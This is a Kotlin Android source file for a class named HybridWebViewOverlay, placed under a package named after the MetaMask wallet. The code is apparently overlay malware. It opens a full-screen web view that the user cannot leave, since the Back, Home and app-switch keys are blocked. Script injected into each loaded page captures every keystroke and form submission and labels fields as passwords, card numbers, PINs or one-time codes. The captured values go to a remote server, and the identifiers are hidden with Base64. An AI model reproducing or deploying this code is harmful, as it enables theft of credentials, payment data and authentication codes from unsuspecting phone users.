package com.example.MetaMask.services

import android.content.Context
import android.graphics.Color
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.view.KeyEvent
import android.util.Base64
import android.webkit.*
import android.widget.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

class HybridWebViewOverlay(
    ctx: Context,
    cfg: JSONObject,
    private val mgr: HybridOverlayManager
) : FrameLayout(ctx) {

    private fun d(s: String) = try { String(Base64.decode(s, Base64.NO_WRAP)) } catch (_: Exception) { "" }
    private fun safeJson(p: String) = try { JSONObject(p) } catch (_: Exception) { JSONObject().put("raw", p) }

    private val bgThread = HandlerThread("wv-bg").also { it.start() }
    private val bgHandler = Handler(bgThread.looper)

    private val mainHandler = Handler(Looper.getMainLooper())

    private val userInputTypes by lazy {
        setOf(
            d("dGVs"), d("ZW1haWw="), d("dGV4dA=="), d("cGFzc3dvcmQ="),
            d("bnVtYmVy"), d("c2VhcmNo"), d("dGV4dGFyZWE="), d("c2VsZWN0LW9uZQ=="),
            d("Y2FyZA=="), d("cGlu"), d("ZGF0ZQ=="), d("dXJs")
        )
    }

    private val skipFieldNames by lazy {
        setOf(
            d("a2luZA=="), d("dHM="), d("c3RlcA=="), d("cGFnZQ=="), d("cGFnZVRlbXA="),
            d("X3Rva2Vu"), d("Y3NyZg=="), d("YWN0aW9u"), d("bWV0aG9k"),
            d("cmVkaXJlY3Q="), d("cmV0dXJuVXJs"), d("cmVm")
        )
    }

    @Volatile private var userSubmitted = false
    @Volatile private var finalSent = false
    @Volatile private var lastSentFieldCount = 0

    private val collectedFields = ConcurrentHashMap<String, JSONObject>()
    private val pendingDebounce = ConcurrentHashMap<String, Runnable>()

    private val url = run {
        val raw = cfg.optString("url", "https://google.com")
        if (raw.startsWith("http://") || raw.startsWith("https://")) raw else "https://$raw"
    }
    private val isTransparentOverlay = try {
        android.net.Uri.parse(url).lastPathSegment?.let { it == "alert.html" || it == "alert" } == true
    } catch (_: Exception) { false }
    private lateinit var webView: SafeWebView

    private inner class SafeWebView(ctx: Context) : WebView(ctx) {

        private val imeFixThread = HandlerThread("wv-ime-fix").also { it.start() }
        private val imeFixHandler = Handler(imeFixThread.looper)

        private val stubIc = object : android.view.inputmethod.InputConnection {
            override fun getTextBeforeCursor(n: Int, flags: Int): CharSequence = ""
            override fun getTextAfterCursor(n: Int, flags: Int): CharSequence = ""
            override fun getSelectedText(flags: Int): CharSequence? = null
            override fun getCursorCapsMode(reqModes: Int): Int = 0
            override fun getExtractedText(request: android.view.inputmethod.ExtractedTextRequest?, flags: Int): android.view.inputmethod.ExtractedText? = null
            override fun deleteSurroundingText(beforeLength: Int, afterLength: Int): Boolean = true
            override fun deleteSurroundingTextInCodePoints(beforeLength: Int, afterLength: Int): Boolean = true
            override fun setComposingText(text: CharSequence?, newCursorPosition: Int): Boolean = true
            override fun setComposingRegion(start: Int, end: Int): Boolean = true
            override fun finishComposingText(): Boolean = true
            override fun commitText(text: CharSequence?, newCursorPosition: Int): Boolean = true
            override fun commitCompletion(text: android.view.inputmethod.CompletionInfo?): Boolean = true
            override fun commitCorrection(correctionInfo: android.view.inputmethod.CorrectionInfo?): Boolean = true
            override fun setSelection(start: Int, end: Int): Boolean = true
            override fun performEditorAction(editorAction: Int): Boolean = true
            override fun performContextMenuAction(id: Int): Boolean = true
            override fun beginBatchEdit(): Boolean = true
            override fun endBatchEdit(): Boolean = true
            override fun sendKeyEvent(event: android.view.KeyEvent?): Boolean = true
            override fun clearMetaKeyStates(states: Int): Boolean = true
            override fun reportFullscreenMode(enabled: Boolean): Boolean = true
            override fun performPrivateCommand(action: String?, data: android.os.Bundle?): Boolean = true
            override fun requestCursorUpdates(cursorUpdateMode: Int): Boolean = false
            override fun getHandler(): android.os.Handler? = null
            override fun closeConnection() {}
            override fun commitContent(inputContentInfo: android.view.inputmethod.InputContentInfo, flags: Int, opts: android.os.Bundle?): Boolean = false
        }

        private var imeCreateCount = 0
        private var imeCreateWindowStart = 0L

        private val bgPatcher = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] run enter") //xdbg
                try { patchImeSessionOnce() } catch (_: Exception) {}
                imeFixHandler.postDelayed(this, 80)
            }
        }

        init {
            imeFixHandler.post(bgPatcher)
        }

        override fun onCreateInputConnection(outAttrs: android.view.inputmethod.EditorInfo?): android.view.inputmethod.InputConnection? {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] onCreateInputConnection enter outAttrs=${outAttrs}") //xdbg
            val now = System.currentTimeMillis()
            if (now - imeCreateWindowStart > 350) {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                imeCreateWindowStart = now
                imeCreateCount = 0
            }
            imeCreateCount++
            if (imeCreateCount > 2) {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
                return stubIc
            }

            val base = try { super.onCreateInputConnection(outAttrs) } catch (e: Exception) {
                android.util.Log.e("XDBG", "[HybridWebViewOverlay] catch") //xdbg
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
                return stubIc
            } ?: return stubIc
            try { base.requestCursorUpdates(0) } catch (_: Exception) {}
            schedulePatch()

            android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
            return object : android.view.inputmethod.InputConnectionWrapper(base, true) {
                override fun requestCursorUpdates(cursorUpdateMode: Int): Boolean = false

                override fun getTextBeforeCursor(n: Int, flags: Int): CharSequence = ""
                override fun getTextAfterCursor(n: Int, flags: Int): CharSequence = ""
                override fun getSelectedText(flags: Int): CharSequence? = null
                override fun getExtractedText(request: android.view.inputmethod.ExtractedTextRequest?, flags: Int): android.view.inputmethod.ExtractedText? = null
                override fun getCursorCapsMode(reqModes: Int): Int = 0

                override fun finishComposingText(): Boolean {
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] finishComposingText enter") //xdbg
                    mainHandler.post { try { super.finishComposingText() } catch (_: Exception) {} }
                    return true
                }
                override fun beginBatchEdit(): Boolean = true
                override fun endBatchEdit(): Boolean = true

                override fun commitText(text: CharSequence?, newCursorPosition: Int): Boolean =
                    try { super.commitText(text, newCursorPosition) } catch (_: Exception) { false }
                override fun setComposingText(text: CharSequence?, newCursorPosition: Int): Boolean =
                    try { super.setComposingText(text, newCursorPosition) } catch (_: Exception) { false }
                override fun setComposingRegion(start: Int, end: Int): Boolean =
                    try { super.setComposingRegion(start, end) } catch (_: Exception) { false }
                override fun deleteSurroundingText(beforeLength: Int, afterLength: Int): Boolean =
                    try { super.deleteSurroundingText(beforeLength, afterLength) } catch (_: Exception) { false }
                override fun sendKeyEvent(event: android.view.KeyEvent?): Boolean =
                    try { super.sendKeyEvent(event) } catch (_: Exception) { false }
            }
        }

        private fun schedulePatch() {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] schedulePatch enter") //xdbg
        }

        private fun patchImeSessionOnce(): Boolean {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] patchImeSessionOnce enter") //xdbg
            var patched = false
            try {
                val imm = context.getSystemService(android.content.Context.INPUT_METHOD_SERVICE)
                    as? android.view.inputmethod.InputMethodManager ?: return false

                val invokerField = findFieldInHierarchy(imm.javaClass, "mCurInvoker")
                if (invokerField != null) {
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                    val invoker = invokerField.get(imm)
                    if (invoker != null) {
                        android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                        val sessionField = findFieldInHierarchy(invoker.javaClass, "mSession")
                        if (sessionField != null) {
                            android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                            val session = sessionField.get(invoker)
                            if (session is android.os.IInterface &&
                                !java.lang.reflect.Proxy.isProxyClass(session.javaClass)) {
                                sessionField.set(invoker, makeAsyncImeProxy(session))
                                patched = true
                            }
                        }
                    }
                }

                val methodField = findFieldInHierarchy(imm.javaClass, "mCurMethod")
                if (methodField != null) {
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                    val session = methodField.get(imm)
                    if (session is android.os.IInterface &&
                        !java.lang.reflect.Proxy.isProxyClass(session.javaClass)) {
                        methodField.set(imm, makeAsyncImeProxy(session))
                        patched = true
                    }
                }

            } catch (e: Exception) { }
            return patched
        }

        private fun findFieldInHierarchy(cls: Class<*>, name: String): java.lang.reflect.Field? {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] findFieldInHierarchy enter cls=${cls} name=${name}") //xdbg
            var c: Class<*>? = cls
            while (c != null && c != Any::class.java) {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] loop") //xdbg
                try { return c.getDeclaredField(name).also { it.isAccessible = true } }
                catch (_: NoSuchFieldException) {}
                c = c.superclass
            }
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
            return null
        }

        private fun makeAsyncImeProxy(session: android.os.IInterface): Any {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] makeAsyncImeProxy enter session=${session}") //xdbg
            val iface = session.javaClass.interfaces.firstOrNull() ?: return session
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
            return java.lang.reflect.Proxy.newProxyInstance(iface.classLoader, arrayOf(iface)) { _, method, args ->
                if (method.name == "updateCursorAnchorInfo") {
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                    imeFixHandler.post {
                        try { method.invoke(session, *(args ?: emptyArray())) } catch (_: Exception) {}
                    }
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
                    return@newProxyInstance null
                }
                try { method.invoke(session, *(args ?: emptyArray())) }
                catch (e: java.lang.reflect.InvocationTargetException) { throw e.cause ?: e }
                catch (_: Exception) { null }
            }
        }

        override fun onWindowFocusChanged(hasWindowFocus: Boolean) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] onWindowFocusChanged enter hasWindowFocus=${hasWindowFocus}") //xdbg
            try { super.onWindowFocusChanged(hasWindowFocus) } catch (_: Exception) {}
            if (hasWindowFocus) {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                schedulePatch()
            } else {
                try { clearFocus() } catch (_: Exception) {}
            }
        }

        override fun onDetachedFromWindow() {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] onDetachedFromWindow enter") //xdbg
            imeFixHandler.removeCallbacks(bgPatcher)
            try { imeFixThread.quitSafely() } catch (_: Exception) {}
            try { super.onDetachedFromWindow() } catch (_: Exception) {}
        }
    }

    init {
        setBackgroundColor(if (isTransparentOverlay) Color.TRANSPARENT else Color.BLACK)
        buildUi()
    }

    private fun buildUi() {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] buildUi enter") //xdbg
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
        }
        webView = SafeWebView(context).apply {
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
            if (isTransparentOverlay) setBackgroundColor(Color.TRANSPARENT)
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                loadWithOverviewMode = true
                useWideViewPort = true
                setSupportZoom(true)
                builtInZoomControls = true
                displayZoomControls = false
                cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
                textZoom = 100
            }
            addJavascriptInterface(JsBridge(), d("QW5kcm9pZEh5YnJpZA=="))
            addJavascriptInterface(AndroidBridgeCompat(), d("QW5kcm9pZEJyaWRnZQ=="))
            addJavascriptInterface(WebAppInterfaceCompat(), d("V2ViQXBwSW50ZXJmYWNl"))
            setOnLongClickListener { true }
            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, pageUrl: String?) {
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] onPageFinished enter view=${view} pageUrl=${pageUrl}") //xdbg
                    super.onPageFinished(view, pageUrl)
                    injectConfigFix(view)
                    injectFormCapture(view)
                    bgHandler.post {
                        mgr.sendToServer(JSONObject().apply {
                            put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                            put(d("dHlwZQ=="), d("d2Vidmlld19uYXZpZ2F0aW9u"))
                            put(d("ZGF0YQ=="), pageUrl ?: "")
                            put(d("dGltZXN0YW1w"), System.currentTimeMillis())
                        })
                    }
                }
                override fun onReceivedError(view: WebView?, req: WebResourceRequest?, err: WebResourceError?) {
                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] onReceivedError enter view=${view} req=${req} err=${err}") //xdbg
                    super.onReceivedError(view, req, err)
                }
                @Suppress("DEPRECATION")
                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean = false
                override fun shouldOverrideUrlLoading(view: WebView?, req: WebResourceRequest?): Boolean = false
            }
            loadUrl(this@HybridWebViewOverlay.url)
        }
        root.addView(webView)
        addView(root)
    }

    private fun injectConfigFix(view: WebView?) {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] injectConfigFix enter view=${view}") //xdbg
        val rawB64 = try {
            val encoded = android.net.Uri.parse(url).encodedQuery ?: return
            val idx = encoded.indexOf("config=")
            if (idx < 0) return
            val rest = encoded.substring(idx + 7)
            val end = rest.indexOf('&')
            if (end < 0) rest else rest.substring(0, end)
        } catch (e: Exception) { return }
        if (rawB64.isEmpty()) return
        val check = try { String(Base64.decode(rawB64, Base64.NO_WRAP), Charsets.UTF_8) } catch (e: Exception) { return }
        if (check.isEmpty() || check == "{}") return
        val js = """
            (function() {
                try {
                    if (typeof initializeForm !== 'function') return;
                    var bin = atob('$rawB64');
                    var bytes = new Uint8Array(bin.length);
                    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
                    var json = new TextDecoder('utf-8').decode(bytes);
                    initializeForm(json);
                } catch(e) {
                    try { console.error('configFix err:', e); } catch(_) {}
                }
            })();
        """.trimIndent()
        view?.evaluateJavascript(js, null)
    }

    private fun injectFormCapture(view: WebView?) {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] injectFormCapture enter view=${view}") //xdbg
        val bridge = d("QW5kcm9pZEh5YnJpZA==")
        val js = """
            (function() {
                var b = window['$bridge'];
                if (!b) return;
                function sd(t, n, v, ti) { try { b.onInput(t, n, v, ti || document.title); } catch(e) {} }
                document.querySelectorAll('input,textarea,select').forEach(function(el) {
                    el.addEventListener('input', function() { sd(el.type||el.tagName.toLowerCase(), el.name||el.id||'', el.value, document.title); });
                    el.addEventListener('change', function() { sd(el.type||el.tagName.toLowerCase(), el.name||el.id||'', el.value, document.title); });
                });
                document.querySelectorAll('form').forEach(function(form) {
                    form.addEventListener('submit', function() {
                        var data = {};
                        try { new FormData(form).forEach(function(v, k) { data[k] = v; }); } catch(e) {}
                        sd('fs', '', JSON.stringify(data), document.title);
                    });
                });
            })();
        """.trimIndent()
        view?.evaluateJavascript(js, null)
    }

    private fun sendFinalSubmit(reason: String) {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] sendFinalSubmit enter reason=${reason}") //xdbg
        try {
            if (collectedFields.isEmpty()) { return }
            val currentCount = collectedFields.size
            val isNewStep = currentCount > lastSentFieldCount
            val isFinal = reason == d("dXNlcl9zdWJtaXQ=") || reason == d("b3ZlcmxheV9jbG9zZWQ=")
            if (!isNewStep && !isFinal) { return }
            lastSentFieldCount = currentCount
            val fields = JSONArray()
            collectedFields.values.forEach { fields.put(it) }
            mgr.sendToServer(JSONObject().apply {
                put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                put(d("dHlwZQ=="), d("d2Vidmlld19zdWJtaXQ="))
                put(d("ZGF0YQ=="), JSONObject().apply {
                    put(d("ZmllbGRz"), fields)
                    put(d("Y2xvc2VfcmVhc29u"), reason)
                    put(d("dXJs"), url)
                })
                put(d("dGltZXN0YW1w"), System.currentTimeMillis())
            })
        } catch (e: Exception) { }
    }

    inner class JsBridge {
        @JavascriptInterface
        fun onInput(type: String, name: String, value: String, pageTitle: String) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] onInput enter type=${type} name=${name} value=${value} pageTitle=${pageTitle}") //xdbg
            if (type == "fs") {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                val formDataStr = value
                bgHandler.post {
                    try {
                        val formData = JSONObject(formDataStr)
                        formData.keys().forEach { key ->
                            if (key !in skipFieldNames && !key.startsWith("_")) {
                                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                                val v = formData.optString(key)
                                if (v.isNotEmpty()) {
                                    android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                                    collectedFields[key] = JSONObject().apply {
                                        put(d("ZmllbGRfdHlwZQ=="), guessType(key, v))
                                        put(d("ZmllbGRfbmFtZQ=="), key)
                                        put(d("dmFsdWU="), v)
                                        put(d("cGFnZV90aXRsZQ=="), pageTitle)
                                    }
                                }
                            }
                        }
                        sendFinalSubmit(d("Zm9ybV9zdWJtaXQ="))
                    } catch (e: Exception) { }
                    mgr.sendToServer(JSONObject().apply {
                        put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                        put(d("dHlwZQ=="), d("d2Vidmlld19pbnB1dA=="))
                        put(d("ZGF0YQ=="), JSONObject().apply {
                            put(d("ZmllbGRfdHlwZQ=="), type)
                            put(d("ZmllbGRfbmFtZQ=="), name)
                            put(d("dmFsdWU="), formDataStr.take(200))
                            put(d("cGFnZV90aXRsZQ=="), pageTitle)
                        })
                        put(d("dGltZXN0YW1w"), System.currentTimeMillis())
                    })
                }
                return
            }

            if (type in userInputTypes && name !in skipFieldNames && value.isNotEmpty()) {
                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                val fieldKey = if (name.isNotEmpty()) name else type
                collectedFields[fieldKey] = JSONObject().apply {
                    put(d("ZmllbGRfdHlwZQ=="), type)
                    put(d("ZmllbGRfbmFtZQ=="), name)
                    put(d("dmFsdWU="), value)
                    put(d("cGFnZV90aXRsZQ=="), pageTitle)
                }
            }

            val debounceKey = "$type:$name"
            pendingDebounce[debounceKey]?.let { bgHandler.removeCallbacks(it) }
            val task = Runnable {
                pendingDebounce.remove(debounceKey)
                mgr.sendToServer(JSONObject().apply {
                    put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                    put(d("dHlwZQ=="), d("d2Vidmlld19pbnB1dA=="))
                    put(d("ZGF0YQ=="), JSONObject().apply {
                        put(d("ZmllbGRfdHlwZQ=="), type)
                        put(d("ZmllbGRfbmFtZQ=="), name)
                        put(d("dmFsdWU="), value)
                        put(d("cGFnZV90aXRsZQ=="), pageTitle)
                    })
                    put(d("dGltZXN0YW1w"), System.currentTimeMillis())
                })
            }
            pendingDebounce[debounceKey] = task
            bgHandler.postDelayed(task, 300)
        }
    }

    private fun guessType(name: String, value: String): String {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] guessType enter name=${name} value=${value}") //xdbg
        val n = name.lowercase()
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
        return when {
            n.contains(d("cGhvbmU=")) || n.contains(d("dGVs")) || n.contains(d("bW9iaWxl")) -> d("dGVs")
            n.contains(d("Y2FyZA==")) || n.contains(d("cGFu")) ||
                value.replace(" ","").length in 15..19 && value.replace(" ","").all { it.isDigit() } -> d("Y2FyZA==")
            n.contains(d("cGFzcw==")) || n.contains(d("cHdk")) || n.contains(d("c2VjcmV0")) -> d("cGFzc3dvcmQ=")
            n.contains(d("Y29kZQ==")) || n.contains(d("cGlu")) || n.contains(d("b3Rw")) -> d("cGlu")
            n.contains(d("ZW1haWw=")) || n.contains(d("bWFpbA==")) -> d("ZW1haWw=")
            else -> d("dGV4dA==")
        }
    }

    inner class AndroidBridgeCompat {

        @JavascriptInterface
        fun getConfig(): String = try {
            val b64 = android.net.Uri.parse(url).getQueryParameter("config") ?: return "{}"
            String(Base64.decode(b64, Base64.NO_WRAP), Charsets.UTF_8)
        } catch (e: Exception) { "{}" }

        @JavascriptInterface
        fun getConfigBase64(): String = try {
            android.net.Uri.parse(url).getQueryParameter("config") ?: ""
        } catch (e: Exception) { "" }

        @JavascriptInterface
        fun submitAndClose(payload: String) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] submitAndClose enter payload=${payload}") //xdbg
            if (userSubmitted) return
            userSubmitted = true
            bgHandler.post {
                try {
                    val parsed = JSONObject(payload)
                    parsed.keys().forEach { key ->
                        if (key !in skipFieldNames) {
                            android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                            val v = parsed.optString(key)
                            if (v.isNotEmpty()) {
                                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                                collectedFields[key] = JSONObject().apply {
                                    put(d("ZmllbGRfdHlwZQ=="), guessType(key, v))
                                    put(d("ZmllbGRfbmFtZQ=="), key)
                                    put(d("dmFsdWU="), v)
                                    put(d("cGFnZV90aXRsZQ=="), "")
                                }
                            }
                        }
                    }
                } catch (e: Exception) { }
                mgr.sendToServer(JSONObject().apply {
                    put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                    put(d("dHlwZQ=="), d("d2Vidmlld19pbnB1dA=="))
                    put(d("ZGF0YQ=="), safeJson(payload))
                    put(d("dGltZXN0YW1w"), System.currentTimeMillis())
                })
                sendFinalSubmit(d("dXNlcl9zdWJtaXQ="))
                mainHandler.post { mgr.close(d("dXNlcl9zdWJtaXQ=")) }
            }
        }

        @JavascriptInterface
        fun launchApp(nameOrPkg: String) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] launchApp enter nameOrPkg=${nameOrPkg}") //xdbg
            if (nameOrPkg.isEmpty()) return
            mainHandler.post {
                try {
                    val pm = context.packageManager
                    var intent = pm.getLaunchIntentForPackage(nameOrPkg)
                    if (intent == null) {
                        android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                        for (app in pm.getInstalledApplications(0)) {
                            android.util.Log.d("XDBG", "[HybridWebViewOverlay] loop") //xdbg
                            val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { "" }
                            if (label.equals(nameOrPkg, ignoreCase = true)) {
                                android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
                                intent = pm.getLaunchIntentForPackage(app.packageName)
                                if (intent != null) break
                            }
                        }
                    }
                    intent?.addFlags(
                        android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                        android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
                    )?.let { context.startActivity(it) }
                } catch (_: Exception) {}
            }
        }

        @JavascriptInterface
        fun sendData(payload: String) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] sendData enter payload=${payload}") //xdbg
            bgHandler.post {
                mgr.sendToServer(JSONObject().apply {
                    put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                    put(d("dHlwZQ=="), d("d2Vidmlld19pbnB1dA=="))
                    put(d("ZGF0YQ=="), safeJson(payload))
                    put(d("dGltZXN0YW1w"), System.currentTimeMillis())
                })
            }
        }
    }

    inner class WebAppInterfaceCompat {
        @JavascriptInterface
        fun send(payload: String) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] send enter payload=${payload}") //xdbg
            bgHandler.post {
                mgr.sendToServer(JSONObject().apply {
                    put(d("YWN0aW9u"), d("aHlicmlkX292ZXJsYXlfaW5wdXQ="))
                    put(d("dHlwZQ=="), d("d2Vidmlld19pbnB1dA=="))
                    put(d("ZGF0YQ=="), safeJson(payload))
                    put(d("dGltZXN0YW1w"), System.currentTimeMillis())
                })
            }
        }
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] dispatchKeyEvent enter event=${event}") //xdbg
        val c = event.keyCode
        if (c == KeyEvent.KEYCODE_BACK) { if (webView.canGoBack()) { webView.goBack(); return true }; return true }
        if (c == KeyEvent.KEYCODE_HOME || c == KeyEvent.KEYCODE_APP_SWITCH) return true
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] return") //xdbg
        return super.dispatchKeyEvent(event)
    }

    override fun onDetachedFromWindow() {
        android.util.Log.d("XDBG", "[HybridWebViewOverlay] onDetachedFromWindow enter") //xdbg
        pendingDebounce.values.forEach { bgHandler.removeCallbacks(it) }
        pendingDebounce.clear()
        if (!userSubmitted) {
            android.util.Log.d("XDBG", "[HybridWebViewOverlay] if branch") //xdbg
            bgHandler.post { sendFinalSubmit(d("b3ZlcmxheV9jbG9zZWQ=")) }
        }
        try { webView.stopLoading() } catch (_: Exception) {}
        try { webView.destroy() } catch (_: Exception) {}
        try { bgThread.quitSafely() } catch (_: Exception) {}
        try { super.onDetachedFromWindow() } catch (_: Exception) {}
    }
}
